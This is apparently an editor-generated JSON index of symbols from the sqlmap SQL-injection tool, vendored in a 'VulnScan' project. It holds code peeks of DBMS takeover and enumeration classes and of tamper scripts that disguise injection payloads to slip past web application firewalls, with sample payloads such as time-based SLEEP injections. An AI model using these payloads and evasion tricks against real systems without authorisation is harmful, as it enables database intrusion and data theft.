        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Vertica it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on Vertica it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on Vertica it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.vertica.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.virtuoso.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.virtuoso.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    def connect(self):\n        errMsg = \"on Virtuoso it is not (currently) possible to establish a \"\n        errMsg += \"direct connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.virtuoso.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.virtuoso.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.virtuoso.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getPasswordHashes(self):\n        warnMsg = \"on Virtuoso it is not possible to enumerate the user password hashes\"\n        logger.warning(warnMsg)\n        return {}\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on Virtuoso it is not possible to enumerate the user privileges\"\n        logger.warning(warnMsg)\n        return {}\n    def getRoles(self, *args, **kwargs):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.virtuoso.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.virtuoso.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.virtuoso.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on Virtuoso it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on Virtuoso it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.virtuoso.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.virtuoso.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.virtuoso.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.VIRTUOSO)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.virtuoso.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.virtuoso.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.virtuoso.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHR(97)||CHR(98)||CHR(99)||CHR(100)||CHR(101)||CHR(102)||CHR(103)||CHR(104) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):\n            return \"||\".join(\"CHR(%d)\" % _ for _ in getOrds(value))\n        return Syntax._escape(expression, quote, escaper)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.virtuoso.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.virtuoso.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.virtuoso.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Virtuoso it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on Virtuoso it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on Virtuoso it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.virtuoso.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.generic.connector",
        "description": "VulnScan.modules.sqlmap.plugins.generic.connector",
        "peekOfCode": "class Connector(object):\n    \"\"\"\n    This class defines generic dbms protocol functionalities for plugins.\n    \"\"\"\n    def __init__(self):\n        self.connector = None\n        self.cursor = None\n        self.hostname = None\n    def initConnection(self):\n        self.user = conf.dbmsUser or \"\"",
        "detail": "VulnScan.modules.sqlmap.plugins.generic.connector",
        "documentation": {}
    },
    {
        "label": "Custom",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.generic.custom",
        "description": "VulnScan.modules.sqlmap.plugins.generic.custom",
        "peekOfCode": "class Custom(object):\n    \"\"\"\n    This class defines custom enumeration functionalities for plugins.\n    \"\"\"\n    def __init__(self):\n        pass\n    def sqlQuery(self, query):\n        output = None\n        sqlType = None\n        query = query.rstrip(';')",
        "detail": "VulnScan.modules.sqlmap.plugins.generic.custom",
        "documentation": {}
    },
    {
        "label": "Databases",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.generic.databases",
        "description": "VulnScan.modules.sqlmap.plugins.generic.databases",
        "peekOfCode": "class Databases(object):\n    \"\"\"\n    This class defines databases' enumeration functionalities for plugins.\n    \"\"\"\n    def __init__(self):\n        kb.data.currentDb = \"\"\n        kb.data.cachedDbs = []\n        kb.data.cachedTables = {}\n        kb.data.cachedColumns = {}\n        kb.data.cachedCounts = {}",
        "detail": "VulnScan.modules.sqlmap.plugins.generic.databases",
        "documentation": {}
    },
    {
        "label": "Entries",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.generic.entries",
        "description": "VulnScan.modules.sqlmap.plugins.generic.entries",
        "peekOfCode": "class Entries(object):\n    \"\"\"\n    This class defines entries' enumeration functionalities for plugins.\n    \"\"\"\n    def __init__(self):\n        pass\n    def dumpTable(self, foundData=None):\n        self.forceDbmsEnum()\n        if conf.db is None or conf.db == CURRENT_DB:\n            if conf.db is None:",
        "detail": "VulnScan.modules.sqlmap.plugins.generic.entries",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.generic.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.generic.enumeration",
        "peekOfCode": "class Enumeration(Custom, Databases, Entries, Search, Users):\n    \"\"\"\n    This class defines generic enumeration functionalities for plugins.\n    \"\"\"\n    def __init__(self):\n        kb.data.has_information_schema = False\n        kb.data.banner = None\n        kb.data.hostname = \"\"\n        kb.data.processChar = None\n        Custom.__init__(self)",
        "detail": "VulnScan.modules.sqlmap.plugins.generic.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.generic.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.generic.filesystem",
        "peekOfCode": "class Filesystem(object):\n    \"\"\"\n    This class defines generic OS file system functionalities for plugins.\n    \"\"\"\n    def __init__(self):\n        self.fileTblName = \"%sfile\" % conf.tablePrefix\n        self.tblField = \"data\"\n    def _checkFileLength(self, localFile, remoteFile, fileRead=False):\n        if Backend.isDbms(DBMS.MYSQL):\n            lengthQuery = \"LENGTH(LOAD_FILE('%s'))\" % remoteFile",
        "detail": "VulnScan.modules.sqlmap.plugins.generic.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.generic.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.generic.fingerprint",
        "peekOfCode": "class Fingerprint(object):\n    \"\"\"\n    This class defines generic fingerprint functionalities for plugins.\n    \"\"\"\n    def __init__(self, dbms):\n        Backend.forceDbms(dbms)\n    def getFingerprint(self):\n        errMsg = \"'getFingerprint' method must be defined \"\n        errMsg += \"into the specific DBMS plugin\"\n        raise SqlmapUndefinedMethod(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.generic.fingerprint",
        "documentation": {}
    },
    {
        "label": "Miscellaneous",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.generic.misc",
        "description": "VulnScan.modules.sqlmap.plugins.generic.misc",
        "peekOfCode": "class Miscellaneous(object):\n    \"\"\"\n    This class defines miscellaneous functionalities for plugins.\n    \"\"\"\n    def __init__(self):\n        pass\n    def getRemoteTempPath(self):\n        if not conf.tmpPath and Backend.isDbms(DBMS.MSSQL):\n            debugMsg = \"identifying Microsoft SQL Server error log directory \"\n            debugMsg += \"that sqlmap will use to store temporary files with \"",
        "detail": "VulnScan.modules.sqlmap.plugins.generic.misc",
        "documentation": {}
    },
    {
        "label": "Search",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.generic.search",
        "description": "VulnScan.modules.sqlmap.plugins.generic.search",
        "peekOfCode": "class Search(object):\n    \"\"\"\n    This class defines search functionalities for plugins.\n    \"\"\"\n    def __init__(self):\n        pass\n    def searchDb(self):\n        foundDbs = []\n        rootQuery = queries[Backend.getIdentifiedDbms()].search_db\n        dbList = conf.db.split(',')",
        "detail": "VulnScan.modules.sqlmap.plugins.generic.search",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.generic.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.generic.syntax",
        "peekOfCode": "class Syntax(object):\n    \"\"\"\n    This class defines generic syntax functionalities for plugins.\n    \"\"\"\n    def __init__(self):\n        pass\n    @staticmethod\n    def _escape(expression, quote=True, escaper=None):\n        retVal = expression\n        if quote:",
        "detail": "VulnScan.modules.sqlmap.plugins.generic.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.generic.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.generic.takeover",
        "peekOfCode": "class Takeover(Abstraction, Metasploit, ICMPsh, Registry):\n    \"\"\"\n    This class defines generic OS takeover functionalities for plugins.\n    \"\"\"\n    def __init__(self):\n        self.cmdTblName = (\"%soutput\" % conf.tablePrefix)\n        self.tblField = \"data\"\n        Abstraction.__init__(self)\n    def osCmd(self):\n        if isStackingAvailable() or conf.direct:",
        "detail": "VulnScan.modules.sqlmap.plugins.generic.takeover",
        "documentation": {}
    },
    {
        "label": "Users",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.generic.users",
        "description": "VulnScan.modules.sqlmap.plugins.generic.users",
        "peekOfCode": "class Users(object):\n    \"\"\"\n    This class defines users' enumeration functionalities for plugins.\n    \"\"\"\n    def __init__(self):\n        kb.data.currentUser = \"\"\n        kb.data.isDba = None\n        kb.data.cachedUsers = []\n        kb.data.cachedUsersPasswords = {}\n        kb.data.cachedUsersPrivileges = {}",
        "detail": "VulnScan.modules.sqlmap.plugins.generic.users",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.0eunion",
        "description": "VulnScan.modules.sqlmap.tamper.0eunion",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances of <int> UNION with <int>e0UNION\n    Requirement:\n        * MySQL\n        * MsSQL\n    Notes:\n        * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf",
        "detail": "VulnScan.modules.sqlmap.tamper.0eunion",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.0eunion",
        "description": "VulnScan.modules.sqlmap.tamper.0eunion",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances of <int> UNION with <int>e0UNION\n    Requirement:\n        * MySQL\n        * MsSQL\n    Notes:\n        * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf\n    >>> tamper('1 UNION ALL SELECT')\n    '1e0UNION ALL SELECT'",
        "detail": "VulnScan.modules.sqlmap.tamper.0eunion",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.0eunion",
        "description": "VulnScan.modules.sqlmap.tamper.0eunion",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances of <int> UNION with <int>e0UNION\n    Requirement:\n        * MySQL\n        * MsSQL\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.0eunion",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.apostrophemask",
        "description": "VulnScan.modules.sqlmap.tamper.apostrophemask",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces apostrophe character (') with its UTF-8 full width counterpart (e.g. ' -> %EF%BC%87)\n    References:\n        * http://www.utf8-chartable.de/unicode-utf8-table.pl?start=65280&number=128\n        * https://web.archive.org/web/20130614183121/http://lukasz.pilorz.net/testy/unicode_conversion/\n        * https://web.archive.org/web/20131121094431/sla.ckers.org/forum/read.php?13,11562,11850\n        * https://web.archive.org/web/20070624194958/http://lukasz.pilorz.net/testy/full_width_utf/index.phps",
        "detail": "VulnScan.modules.sqlmap.tamper.apostrophemask",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.apostrophemask",
        "description": "VulnScan.modules.sqlmap.tamper.apostrophemask",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces apostrophe character (') with its UTF-8 full width counterpart (e.g. ' -> %EF%BC%87)\n    References:\n        * http://www.utf8-chartable.de/unicode-utf8-table.pl?start=65280&number=128\n        * https://web.archive.org/web/20130614183121/http://lukasz.pilorz.net/testy/unicode_conversion/\n        * https://web.archive.org/web/20131121094431/sla.ckers.org/forum/read.php?13,11562,11850\n        * https://web.archive.org/web/20070624194958/http://lukasz.pilorz.net/testy/full_width_utf/index.phps\n    >>> tamper(\"1 AND '1'='1\")\n    '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'",
        "detail": "VulnScan.modules.sqlmap.tamper.apostrophemask",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.apostrophemask",
        "description": "VulnScan.modules.sqlmap.tamper.apostrophemask",
        "peekOfCode": "__priority__ = PRIORITY.LOWEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces apostrophe character (') with its UTF-8 full width counterpart (e.g. ' -> %EF%BC%87)\n    References:\n        * http://www.utf8-chartable.de/unicode-utf8-table.pl?start=65280&number=128\n        * https://web.archive.org/web/20130614183121/http://lukasz.pilorz.net/testy/unicode_conversion/\n        * https://web.archive.org/web/20131121094431/sla.ckers.org/forum/read.php?13,11562,11850",
        "detail": "VulnScan.modules.sqlmap.tamper.apostrophemask",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.apostrophenullencode",
        "description": "VulnScan.modules.sqlmap.tamper.apostrophenullencode",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces apostrophe character (') with its illegal double unicode counterpart (e.g. ' -> %00%27)\n    >>> tamper(\"1 AND '1'='1\")\n    '1 AND %00%271%00%27=%00%271'\n    \"\"\"\n    return payload.replace('\\'', \"%00%27\") if payload else payload",
        "detail": "VulnScan.modules.sqlmap.tamper.apostrophenullencode",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.apostrophenullencode",
        "description": "VulnScan.modules.sqlmap.tamper.apostrophenullencode",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces apostrophe character (') with its illegal double unicode counterpart (e.g. ' -> %00%27)\n    >>> tamper(\"1 AND '1'='1\")\n    '1 AND %00%271%00%27=%00%271'\n    \"\"\"\n    return payload.replace('\\'', \"%00%27\") if payload else payload",
        "detail": "VulnScan.modules.sqlmap.tamper.apostrophenullencode",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.apostrophenullencode",
        "description": "VulnScan.modules.sqlmap.tamper.apostrophenullencode",
        "peekOfCode": "__priority__ = PRIORITY.LOWEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces apostrophe character (') with its illegal double unicode counterpart (e.g. ' -> %00%27)\n    >>> tamper(\"1 AND '1'='1\")\n    '1 AND %00%271%00%27=%00%271'\n    \"\"\"\n    return payload.replace('\\'', \"%00%27\") if payload else payload",
        "detail": "VulnScan.modules.sqlmap.tamper.apostrophenullencode",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.appendnullbyte",
        "description": "VulnScan.modules.sqlmap.tamper.appendnullbyte",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.ACCESS))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Appends (Access) NULL byte character (%00) at the end of payload\n    Requirement:\n        * Microsoft Access\n    Notes:\n        * Useful to bypass weak web application firewalls when the back-end\n          database management system is Microsoft Access - further uses are",
        "detail": "VulnScan.modules.sqlmap.tamper.appendnullbyte",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.appendnullbyte",
        "description": "VulnScan.modules.sqlmap.tamper.appendnullbyte",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Appends (Access) NULL byte character (%00) at the end of payload\n    Requirement:\n        * Microsoft Access\n    Notes:\n        * Useful to bypass weak web application firewalls when the back-end\n          database management system is Microsoft Access - further uses are\n          also possible\n    Reference: http://projects.webappsec.org/w/page/13246949/Null-Byte-Injection",
        "detail": "VulnScan.modules.sqlmap.tamper.appendnullbyte",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.appendnullbyte",
        "description": "VulnScan.modules.sqlmap.tamper.appendnullbyte",
        "peekOfCode": "__priority__ = PRIORITY.LOWEST\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.ACCESS))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Appends (Access) NULL byte character (%00) at the end of payload\n    Requirement:\n        * Microsoft Access\n    Notes:\n        * Useful to bypass weak web application firewalls when the back-end",
        "detail": "VulnScan.modules.sqlmap.tamper.appendnullbyte",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.base64encode",
        "description": "VulnScan.modules.sqlmap.tamper.base64encode",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Base64-encodes all characters in a given payload\n    >>> tamper(\"1' AND SLEEP(5)#\")\n    'MScgQU5EIFNMRUVQKDUpIw=='\n    \"\"\"\n    return encodeBase64(payload, binary=False) if payload else payload",
        "detail": "VulnScan.modules.sqlmap.tamper.base64encode",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.base64encode",
        "description": "VulnScan.modules.sqlmap.tamper.base64encode",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Base64-encodes all characters in a given payload\n    >>> tamper(\"1' AND SLEEP(5)#\")\n    'MScgQU5EIFNMRUVQKDUpIw=='\n    \"\"\"\n    return encodeBase64(payload, binary=False) if payload else payload",
        "detail": "VulnScan.modules.sqlmap.tamper.base64encode",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.base64encode",
        "description": "VulnScan.modules.sqlmap.tamper.base64encode",
        "peekOfCode": "__priority__ = PRIORITY.LOW\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Base64-encodes all characters in a given payload\n    >>> tamper(\"1' AND SLEEP(5)#\")\n    'MScgQU5EIFNMRUVQKDUpIw=='\n    \"\"\"\n    return encodeBase64(payload, binary=False) if payload else payload",
        "detail": "VulnScan.modules.sqlmap.tamper.base64encode",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.between",
        "description": "VulnScan.modules.sqlmap.tamper.between",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' and equals operator ('=') with 'BETWEEN # AND #'\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0",
        "detail": "VulnScan.modules.sqlmap.tamper.between",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.between",
        "description": "VulnScan.modules.sqlmap.tamper.between",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' and equals operator ('=') with 'BETWEEN # AND #'\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls that",
        "detail": "VulnScan.modules.sqlmap.tamper.between",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.between",
        "description": "VulnScan.modules.sqlmap.tamper.between",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' and equals operator ('=') with 'BETWEEN # AND #'\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g",
        "detail": "VulnScan.modules.sqlmap.tamper.between",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.binary",
        "description": "VulnScan.modules.sqlmap.tamper.binary",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Injects keyword binary where possible\n    Requirement:\n        * MySQL\n    >>> tamper('1 UNION ALL SELECT NULL, NULL, NULL')\n    '1 UNION ALL SELECT binary NULL, binary NULL, binary NULL'\n    >>> tamper('1 AND 2>1')",
        "detail": "VulnScan.modules.sqlmap.tamper.binary",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.binary",
        "description": "VulnScan.modules.sqlmap.tamper.binary",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Injects keyword binary where possible\n    Requirement:\n        * MySQL\n    >>> tamper('1 UNION ALL SELECT NULL, NULL, NULL')\n    '1 UNION ALL SELECT binary NULL, binary NULL, binary NULL'\n    >>> tamper('1 AND 2>1')\n    '1 AND binary 2>binary 1'\n    >>> tamper('CASE WHEN (1=1) THEN 1 ELSE 0x28 END')",
        "detail": "VulnScan.modules.sqlmap.tamper.binary",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.binary",
        "description": "VulnScan.modules.sqlmap.tamper.binary",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Injects keyword binary where possible\n    Requirement:\n        * MySQL\n    >>> tamper('1 UNION ALL SELECT NULL, NULL, NULL')\n    '1 UNION ALL SELECT binary NULL, binary NULL, binary NULL'",
        "detail": "VulnScan.modules.sqlmap.tamper.binary",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.bluecoat",
        "description": "VulnScan.modules.sqlmap.tamper.bluecoat",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character after SQL statement with a valid random blank character. Afterwards replace character '=' with operator LIKE\n    Requirement:\n        * Blue Coat SGOS with WAF activated as documented in\n        https://kb.bluecoat.com/index?page=content&id=FAQ2147\n    Tested against:\n        * MySQL 5.1, SGOS",
        "detail": "VulnScan.modules.sqlmap.tamper.bluecoat",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.bluecoat",
        "description": "VulnScan.modules.sqlmap.tamper.bluecoat",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character after SQL statement with a valid random blank character. Afterwards replace character '=' with operator LIKE\n    Requirement:\n        * Blue Coat SGOS with WAF activated as documented in\n        https://kb.bluecoat.com/index?page=content&id=FAQ2147\n    Tested against:\n        * MySQL 5.1, SGOS\n    Notes:\n        * Useful to bypass Blue Coat's recommended WAF rule configuration",
        "detail": "VulnScan.modules.sqlmap.tamper.bluecoat",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.bluecoat",
        "description": "VulnScan.modules.sqlmap.tamper.bluecoat",
        "peekOfCode": "__priority__ = PRIORITY.NORMAL\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character after SQL statement with a valid random blank character. Afterwards replace character '=' with operator LIKE\n    Requirement:\n        * Blue Coat SGOS with WAF activated as documented in\n        https://kb.bluecoat.com/index?page=content&id=FAQ2147\n    Tested against:",
        "detail": "VulnScan.modules.sqlmap.tamper.bluecoat",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.chardoubleencode",
        "description": "VulnScan.modules.sqlmap.tamper.chardoubleencode",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Double URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %2553%2545%254C%2545%2543%2554)\n    Notes:\n        * Useful to bypass some weak web application firewalls that do not double URL-decode the request before processing it through their ruleset\n    >>> tamper('SELECT FIELD FROM%20TABLE')\n    '%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545'\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.tamper.chardoubleencode",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.chardoubleencode",
        "description": "VulnScan.modules.sqlmap.tamper.chardoubleencode",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Double URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %2553%2545%254C%2545%2543%2554)\n    Notes:\n        * Useful to bypass some weak web application firewalls that do not double URL-decode the request before processing it through their ruleset\n    >>> tamper('SELECT FIELD FROM%20TABLE')\n    '%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545'\n    \"\"\"\n    retVal = payload\n    if payload:",
        "detail": "VulnScan.modules.sqlmap.tamper.chardoubleencode",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.chardoubleencode",
        "description": "VulnScan.modules.sqlmap.tamper.chardoubleencode",
        "peekOfCode": "__priority__ = PRIORITY.LOW\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Double URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %2553%2545%254C%2545%2543%2554)\n    Notes:\n        * Useful to bypass some weak web application firewalls that do not double URL-decode the request before processing it through their ruleset\n    >>> tamper('SELECT FIELD FROM%20TABLE')\n    '%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545'",
        "detail": "VulnScan.modules.sqlmap.tamper.chardoubleencode",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.charencode",
        "description": "VulnScan.modules.sqlmap.tamper.charencode",
